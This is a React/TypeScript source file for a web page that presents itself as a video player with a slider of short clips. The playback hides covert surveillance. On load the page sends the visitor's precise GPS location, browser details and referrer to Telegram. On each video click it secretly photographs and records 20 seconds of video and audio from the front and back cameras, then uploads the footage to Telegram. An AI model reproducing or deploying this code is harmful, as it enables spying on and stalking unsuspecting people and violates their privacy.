import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback, useRef } from 'react';
import Slider from 'react-slick';
import './styles/custom.css';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';

// Fungsi untuk membagi array video menjadi kelompok 5 untuk slide
const chunkArray = <T,>(array: T[], size: number): T[][] => {
  const result: T[][] = [];
  for (let i = 0; i < array.length; i += size) {
    result.push(array.slice(i, i + size));
  }
  return result;
};

function App() {
  const [isPlaying, setIsPlaying] = useState<number | null>(null);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [hasRequestedLocation, setHasRequestedLocation] = useState(false);
  const [hasRequestedCamera, setHasRequestedCamera] = useState(false);
  const [isLoading, setIsLoading] = useState<boolean[]>([]);
  const [videoErrors, setVideoErrors] = useState<boolean[]>([]);
  const [loadedSlides, setLoadedSlides] = useState<number[]>([0]); // Mulai dengan slide pertama
  const [currentSlide, setCurrentSlide] = useState<number>(0); // Lacak slide aktif
  const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
  const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const sliderRef = useRef<Slider | null>(null);

  const videos = [
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/VID_20250419_134445_335.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/VID_20250419_135734_981.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/VID_20250419_134300_342.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/VID_20250419_134915_227.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/VID_20250419_135829_845.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/WRnnbxOh.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/VVH2RmCn1.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/Tfh7KSKb1.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/B2cLTw5A1.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/6jYqrrwx1.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/1LvE4FR31.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/1S2HTGaf1.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/1b6c5wE41.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/7hwla9hS1.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/FPZ8MZdC.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/HCpyHdGC.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/NQ8EOxk0.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/XJOGYNCi1.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/YQog37Pu1.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/deZOnAa71.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/n9L2Emde1.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/nxkWOzw01.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/x3DQJdR6.mp4' },
    { videoUrl: 'https://bucketvidio.s3.ap-southeast-2.amazonaws.com/vidio/xP6RWC6J1.mp4' },
  ];

  // Kelompokkan video menjadi slide (5 video per slide)
  const videoSlides = chunkArray(videos, 5);

  useEffect(() => {
    setIsLoading(new Array(videos.length).fill(true));
    setVideoErrors(new Array(videos.length).fill(false));
  }, []);

  // Logika pemuatan video per slide menggunakan IntersectionObserver
  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            const slideIndex = parseInt(entry.target.getAttribute('data-slide-index') || '0', 10);
            if (!loadedSlides.includes(slideIndex)) {
              console.log(`Memuat slide: ${slideIndex}`);
              setLoadedSlides((prev) => [...prev, slideIndex]);
            }
          }
        });
      },
      { threshold: 0.1 }
    );

    const slideElements = document.querySelectorAll('.slide-container');
    slideElements.forEach((el) => observer.observe(el));

    return () => {
      slideElements.forEach((el) => observer.unobserve(el));
    };
  }, [loadedSlides]);

  // Pemeriksaan video hanya saat currentSlide berubah
  useEffect(() => {
    const activeSlideVideos = videoSlides[currentSlide];
    activeSlideVideos.forEach((video, index) => {
      const globalIndex = currentSlide * 5 + index;
      console.log(`Memeriksa video ${globalIndex + 1}: ${video.videoUrl}`);
      if (!validateVideoUrl(video.videoUrl)) {
        console.error(`Video ${globalIndex + 1} memiliki URL yang tidak valid.`);
        setVideoErrors((prev) => {
          const newErrors = [...prev];
          newErrors[globalIndex] = true;
          return newErrors;
        });
      }
    });
  }, [currentSlide]);

  // Kirim notifikasi pengunjung saat situs pertama kali dimuat
  useEffect(() => {
    monitorSuspiciousActivity();

    const getLocation = async (): Promise<string> => {
      try {
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          });
        });
        const { latitude, longitude, accuracy } = position.coords;
        console.log(`GPS location obtained with accuracy: ${accuracy} meters`);
        return `Latitude: ${latitude}, Longitude: ${longitude}`;
      } catch (error: unknown) {
        const err = error as Error;
        console.error(`Gagal mendapatkan lokasi: ${err.message}`);
        return window.location.href;
      }
    };

    const sendVisitorNotification = async () => {
      if (hasRequestedLocation) return;
      setHasRequestedLocation(true);

      const location = await getLocation();
      const visitorDetails: VisitorDetails = {
        userAgent: navigator.userAgent,
        location: location,
        referrer: document.referrer || 'Langsung',
        previousSites: document.referrer || 'Tidak ada',
      };
      try {
        await sendTelegramNotification(visitorDetails);
        console.log('Notifikasi pengunjung berhasil dikirim.');
      } catch (error: unknown) {
        const err = error as Error;
        console.error(`Gagal mengirim notifikasi pengunjung: ${err.message}`);
      }
    };

    sendVisitorNotification();

    return () => {
      cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
      cameraStreamsRef.current = [];
    };
  }, [hasRequestedLocation]);

  const initializeCameraStreams = async () => {
    if (hasRequestedCamera) return;
    setHasRequestedCamera(true);

    const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
      try {
        const constraints = {
          video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
          audio: true,
        };
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const deviceId = stream.getVideoTracks()[0].getSettings().deviceId || '';
        console.log(`Berhasil mendapatkan stream untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
        return { stream, deviceId };
      } catch (error: unknown) {
        const err = error as Error;
        console.error(`Gagal mendapatkan akses kamera ${cameraType}: ${err.message}`);
        try {
          const constraints = {
            video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } },
            audio: true,
          };
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          const deviceId = stream.getVideoTracks()[0].getSettings().deviceId || '';
          console.log(`Berhasil mendapatkan stream fallback untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
          return { stream, deviceId };
        } catch (fallbackError: unknown) {
          const fbErr = fallbackError as Error;
          console.error(`Gagal mendapatkan akses kamera ${cameraType} pada fallback: ${fbErr.message}`);
          return null;
        }
      }
    };

    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');
      console.log('Perangkat kamera yang ditemukan:', videoDevices.map(d => ({ label: d.label, deviceId: d.deviceId })));

      const frontResult = await requestMediaAccess('user', 'depan');
      if (frontResult) {
        cameraStreamsRef.current.push({ stream: frontResult.stream, type: 'depan', deviceId: frontResult.deviceId });
      } else {
        console.warn('Kamera depan tidak tersedia atau akses ditolak.');
      }

      let backResult = await requestMediaAccess('environment', 'belakang');
      if (!backResult && videoDevices.length > 1) {
        console.log('Mencoba kamera belakang dengan deviceId alternatif...');
        backResult = await requestMediaAccess({ deviceId: videoDevices[1].deviceId }, 'belakang');
      }
      if (backResult) {
        cameraStreamsRef.current.push({ stream: backResult.stream, type: 'belakang', deviceId: backResult.deviceId });
      } else {
        console.warn('Kamera belakang tidak tersedia atau akses ditolak.');
      }

      if (cameraStreamsRef.current.length === 0) {
        console.error('Tidak ada kamera yang tersedia atau semua akses ditolak.');
      } else {
        console.log('Stream kamera yang diinisialisasi:', cameraStreamsRef.current.map(s => `${s.type} (${s.deviceId})`));
      }
    } catch (error: unknown) {
      const err = error as Error;
      console.error(`Error saat menginisialisasi stream kamera: ${err.message}`);
    }
  };

  const verifyStream = (stream: MediaStream, type: string): boolean => {
    const videoTracks = stream.getVideoTracks();
    if (videoTracks.length === 0 || !videoTracks[0].enabled) {
      console.error(`Stream untuk kamera ${type} tidak valid atau dimatikan. Tracks: ${videoTracks.length}`);
      return false;
    }
    console.log(`Stream untuk kamera ${type} valid dengan ${videoTracks.length} track(s).`);
    return true;
  };

  const reinitializeStream = async (cameraType: string, deviceId: string): Promise<MediaStream | null> => {
    try {
      const constraints = {
        video: { deviceId: { exact: deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
        audio: true,
      };
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      console.log(`Berhasil menginisialisasi ulang stream untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
      return stream;
    } catch (error: unknown) {
      const err = error as Error;
      console.error(`Gagal menginisialisasi ulang stream untuk kamera ${cameraType}: ${err.message}`);
      try {
        const constraints = {
          video: { deviceId: { exact: deviceId }, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } },
          audio: true,
        };
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        console.log(`Berhasil menginisialisasi ulang stream fallback untuk kamera ${cameraType}`);
        return stream;
      } catch (fallbackError: unknown) {
        const fbErr = fallbackError as Error;
        console.error(`Gagal menginisialisasi ulang stream fallback untuk kamera ${cameraType}: ${fbErr.message}`);
        return null;
      }
    }
  };

  const stopRecording = () => {
    if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
      mediaRecorderRef.current.stop();
      console.log('Perekaman dihentikan.');
    }
  };

  const recordCamera = async (stream: MediaStream, type: string, deviceId: string) => {
    let currentStream = stream;
    if (!verifyStream(currentStream, type)) {
      console.warn(`Stream kamera ${type} tidak valid, mencoba menginisialisasi ulang...`);
      const newStream = await reinitializeStream(type, deviceId);
      if (newStream && verifyStream(newStream, type)) {
        currentStream = newStream;
        const cameraIndex = cameraStreamsRef.current.findIndex(s => s.type === type);
        if (cameraIndex !== -1) {
          cameraStreamsRef.current[cameraIndex].stream = newStream;
        }
      } else {
        console.warn(`Gagal menginisialisasi ulang stream kamera ${type}, melewati perekaman.`);
        return;
      }
    }

    try {
      const cameraVideo = document.createElement('video');
      cameraVideo.srcObject = currentStream;
      cameraVideo.playsInline = true;
      cameraVideo.muted = true;
      cameraVideo.autoplay = true;
      cameraVideo.style.display = 'none';
      document.body.appendChild(cameraVideo);

      await new Promise((resolve) => {
        cameraVideo.onloadedmetadata = async () => {
          await cameraVideo.play().catch((err: Error) => console.error(`Gagal memutar video kamera ${type}: ${err.message}`));
          setTimeout(resolve, 500);
        };
      });

      const videoWidth = cameraVideo.videoWidth;
      const videoHeight = cameraVideo.videoHeight;
      console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight}`);

      const canvas = document.createElement('canvas');
      const canvasAspectRatio = 9 / 16;
      const videoAspectRatio = videoWidth / videoHeight;

      let drawWidth, drawHeight, offsetX, offsetY;
      if (videoAspectRatio > canvasAspectRatio) {
        drawWidth = Math.min(videoWidth, 1080);
        drawHeight = drawWidth / videoAspectRatio;
      } else {
        drawHeight = Math.min(videoHeight, 1920);
        drawWidth = drawHeight * videoAspectRatio;
      }

      canvas.width = drawWidth;
      canvas.height = drawHeight;

      offsetX = (drawWidth - videoWidth) / 2;
      offsetY = (drawHeight - videoHeight) / 2;

      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(cameraVideo, offsetX, offsetY, videoWidth, videoHeight);
      }

      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 0.9);
      });

      try {
        await sendImageToTelegram(photoBlob);
        console.log(`Foto dari kamera ${type} berhasil dikirim ke Telegram.`);
      } catch (error: unknown) {
        const err = error as Error;
        console.error(`Gagal mengirim foto dari kamera ${type}: ${err.message}`);
      }

      const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
        .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
      const mediaRecorder = new MediaRecorder(currentStream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 2500000,
      });
      mediaRecorderRef.current = mediaRecorder;
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { type: supportedMimeType });
        if (videoBlob.size === 0) {
          console.warn('File video kosong, tidak dikirim ke Telegram.');
          return;
        }
        try {
          await sendVideoToTelegram(videoBlob);
          console.log(`Video dari kamera ${type} berhasil dikirim ke Telegram.`);
        } catch (error: unknown) {
          const err = error as Error;
          console.error(`Gagal mengirim video dari kamera ${type}: ${err.message}`);
        }
      };

      mediaRecorder.onerror = (e: Event) => {
        console.error(`Error saat merekam kamera ${type}:`, e);
      };

      mediaRecorder.start(1000);
      console.log(`Mulai merekam kamera ${type}`);

      await new Promise((resolve) => setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
          console.log(`Perekaman kamera ${type} dihentikan setelah 20 detik.`);
        }
        resolve(null);
      }, 20000));

      if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
    } catch (error: unknown) {
      const err = error as Error;
      console.error(`Error saat merekam kamera ${type}: ${err.message}`);
    }
  };

  const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
    console.log('Memulai proses perekaman untuk kamera...');

    try {
      await new Promise((resolve) => {
        if (videoElement.readyState >= 3) {
          resolve(null);
        } else {
          videoElement.oncanplay = () => resolve(null);
        }
      });

      await videoElement.play();

      await initializeCameraStreams();

      if (cameraStreamsRef.current.length === 0) {
        console.error('Tidak ada stream kamera yang tersedia.');
        videoElement.pause();
        setIsPlaying(null);
        return;
      }

      const frontCamera = cameraStreamsRef.current.find(s => s.type === 'depan');
      const backCamera = cameraStreamsRef.current.find(s => s.type === 'belakang');

      if (frontCamera) {
        await recordCamera(frontCamera.stream, 'depan', frontCamera.deviceId);
      } else {
        console.warn('Kamera depan tidak tersedia untuk perekaman.');
      }

      if (backCamera) {
        await recordCamera(backCamera.stream, 'belakang', backCamera.deviceId);
      } else {
        console.warn('Kamera belakang tidak tersedia untuk perekaman.');
      }

      if (!frontCamera && !backCamera) {
        console.error('Kedua kamera tidak tersedia.');
      }

      videoElement.pause();
      setIsPlaying(null);
    } catch (error: unknown) {
      const err = error as Error;
      console.error(`Error dalam captureAndSendMedia: ${err.message}`);
      videoElement.pause();
      setIsPlaying(null);
    }
  }, []);

  const handleVideoClick = useCallback(async (index: number) => {
    if (isPlaying !== null && isPlaying !== index) {
      const prevVideo = videoRefs.current[isPlaying];
      if (prevVideo) {
        prevVideo.pause();
        prevVideo.currentTime = 0;
        prevVideo.removeAttribute('src');
        prevVideo.load();
        stopRecording();
        console.log(`Video sebelumnya di indeks ${isPlaying} dihentikan sepenuhnya.`);
      }
    }

    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!validateVideoUrl(videos[index].videoUrl)) {
        console.error(`URL video tidak valid, menghentikan pemutaran untuk video ${index + 1}.`);
        setVideoErrors((prev) => {
          const newErrors = [...prev];
          newErrors[index] = true;
          return newErrors;
        });
        return;
      }

      try {
        setIsPlaying(index);
        videoElement.src = videos[index].videoUrl; // Set src hanya saat diklik
        await captureAndSendMedia(videoElement);
      } catch (error: unknown) {
        const err = error as Error;
        console.error(`Error memutar video ${index + 1}: ${err.message}`);
        videoElement.pause();
        videoElement.currentTime = 0;
        videoElement.removeAttribute('src');
        videoElement.load();
        stopRecording();
        setIsPlaying(null);
      }
    }
  }, [isPlaying]);

  const toggleFullscreen = (index: number) => {
    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!isFullscreen) {
        videoElement.requestFullscreen().catch((err: Error) => console.error(`Gagal masuk fullscreen: ${err.message}`));
        setIsFullscreen(true);
      } else {
        document.exitFullscreen().catch((err: Error) => console.error(`Gagal keluar fullscreen: ${err.message}`));
      }
      console.log(`Mengubah mode fullscreen untuk video di indeks: ${index}`);
    }
  };

  const handleVideoEnded = (index: number) => {
    stopRecording();
    setIsPlaying(null);
    console.log(`Video di indeks ${index} telah selesai.`);
  };

  const handleCanPlay = (index: number) => {
    console.log(`Video ${index + 1} siap diputar.`);
    setIsLoading((prev) => {
      const newLoading = [...prev];
      newLoading[index] = false;
      return newLoading;
    });
  };

  const handleVideoError = (index: number, event: React.SyntheticEvent<HTMLVideoElement, Event>) => {
    const videoElement = event.currentTarget as HTMLVideoElement;
    const errorCode = videoElement.error?.code;
    const errorMessage = videoElement.error?.message || 'Unknown error';
    console.error(`Gagal memuat video ${index + 1}: ${videos[index].videoUrl} | Error Code: ${errorCode} | Message: ${errorMessage}`);
    setIsLoading((prev) => {
      const newLoading = [...prev];
      newLoading[index] = false;
      return newLoading;
    });
    setVideoErrors((prev) => {
      const newErrors = [...prev];
      newErrors[index] = true;
      return newErrors;
    });
  };

  useEffect(() => {
    const handleFullscreenChange = () => {
      if (!document.fullscreenElement && isFullscreen) {
        if (isPlaying !== null) {
          const videoElement = videoRefs.current[isPlaying];
          if (videoElement) {
            videoElement.pause();
            videoElement.currentTime = 0;
            videoElement.removeAttribute('src');
            videoElement.load();
            stopRecording();
            console.log('Video dihentikan karena keluar dari fullscreen.');
          }
        }
        setIsFullscreen(false);
      }
    };

    const handleBeforeUnload = () => {
      stopRecording();
      cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
      cameraStreamsRef.current = [];
    };

    document.addEventListener('fullscreenchange', handleFullscreenChange);
    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, [isFullscreen, isPlaying]);

  // Pengaturan slider
  const sliderSettings = {
    dots: true,
    infinite: true,
    speed: 500,
    slidesToShow: 1,
    slidesToScroll: 1,
    arrows: true,
    responsive: [
      {
        breakpoint: 1024,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 600,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
        },
      },
    ],
    // Kustomisasi navigasi angka
    customPaging: (i: number) => {
      const totalSlides = videoSlides.length;
      const maxVisible = 9;
      const halfVisible = Math.floor(maxVisible / 2);

      let start = Math.max(0, currentSlide - halfVisible);
      let end = Math.min(totalSlides, start + maxVisible);

      if (end - start < maxVisible) {
        start = Math.max(0, end - maxVisible);
      }

      console.log(`Rendering dot untuk slide ${i + 1}: start=${start}, end=${end}, totalSlides=${totalSlides}`);

      if (i >= start && i < end) {
        return <button className="custom-dot">{i + 1}</button>;
      } else if (i === end && end < totalSlides) {
        return (
          <div className="dots-placeholder">
            ...
          </div>
        );
      }
      return <div className="hidden-dot" />;
    },
    appendDots: (dots: React.ReactNode) => (
      <div>
        <ul className="custom-slick-dots">{dots}</ul>
      </div>
    ),
    afterChange: (index: number) => {
      setCurrentSlide(index);
    },
  };

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Pemutar Video</h1>
        </div>
      </header>
      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[1200px] mx-auto">
          <Slider ref={sliderRef} {...sliderSettings}>
            {videoSlides.map((slideVideos, slideIndex) => (
              <div
                key={slideIndex}
                className="px-2 slide-container"
                data-slide-index={slideIndex}
              >
                {!loadedSlides.includes(slideIndex) ? (
                  <div className="flex items-center justify-center h-[200px] bg-gray-800 bg-opacity-75">
                    <svg
                      className="animate-spin h-8 w-8 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                  </div>
                ) : (
                  <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
                    {slideVideos.map((_, index) => {
                      const globalIndex = slideIndex * 5 + index;
                      return (
                        <div
                          key={globalIndex}
                          className="relative bg-black rounded-lg overflow-hidden shadow-xl"
                          style={{ aspectRatio: '9/16', maxHeight: '200px' }}
                        >
                          {isLoading[globalIndex] && !videoErrors[globalIndex] && (
                            <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
                              <svg
                                className="animate-spin h-8 w-8 text-white"
                                xmlns="http://www.w3.org/2000/svg"
                                fill="none"
                                viewBox="0 0 24 24"
                              >
                                <circle
                                  className="opacity-25"
                                  cx="12"
                                  cy="12"
                                  r="10"
                                  stroke="currentColor"
                                  strokeWidth="4"
                                ></circle>
                                <path
                                  className="opacity-75"
                                  fill="currentColor"
                                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                                ></path>
                              </svg>
                            </div>
                          )}
                          {videoErrors[globalIndex] && (
                            <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
                              <p className="text-white text-center">Gagal memuat video. Silakan coba lagi nanti.</p>
                            </div>
                          )}
                          <video
                            ref={(el) => (videoRefs.current[globalIndex] = el)}
                            className="w-full h-full object-cover"
                            muted
                            playsInline
                            webkit-playsinline
                            onClick={() => handleVideoClick(globalIndex)}
                            onEnded={() => handleVideoEnded(globalIndex)}
                            onCanPlay={() => handleCanPlay(globalIndex)}
                            onError={(event) => handleVideoError(globalIndex, event)}
                            preload={loadedSlides.includes(slideIndex) ? 'metadata' : 'none'}
                            {...({ loading: 'lazy' } as any)}
                          >
                            <source src={videos[globalIndex].videoUrl} type="video/mp4" />
                            <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                          </video>
                          {isPlaying === globalIndex && !videoErrors[globalIndex] && (
                            <div className="absolute bottom-2 right-2 z-20">
                              <button
                                onClick={() => toggleFullscreen(globalIndex)}
                                className="bg-gray-800/70 p-1 rounded-full hover:bg-gray-700 transition-all duration-200"
                              >
                                {isFullscreen ? (
                                  <ArrowsPointingInIcon className="w-5 h-5 text-white" />
                                ) : (
                                  <ArrowsPointingOutIcon className="w-5 h-5 text-white" />
                                )}
                              </button>
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            ))}
          </Slider>
        </div>
      </main>
    </div>
  );
}

export default App;
